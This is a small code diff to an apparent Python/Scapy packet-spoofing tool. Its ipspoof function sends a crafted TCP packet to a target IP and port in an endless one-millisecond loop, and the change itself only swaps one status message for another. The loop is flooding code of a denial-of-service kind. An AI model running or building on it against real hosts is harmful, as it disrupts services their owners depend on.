@@ -33,9 +33,9 @@ def ipspoof(source_ip, source_port, target_ip, target_port):
             TCP1 = TCP(sport=src_port, dport=tgt_port)
             pkt = IP1 / TCP1
 
+            print(f'[{Fore.YELLOW}?{Style.RESET_ALL}] Sending packets to {Fore.YELLOW}{target_ip}{Style.RESET_ALL} on port {Fore.YELLOW}{target_port}{Style.RESET_ALL}...')
             while True:
                 send(pkt, inter= .001, verbose=0)
-                print(f"Packet(s) sent [{i}]")
                 i=i+1
 
         else:
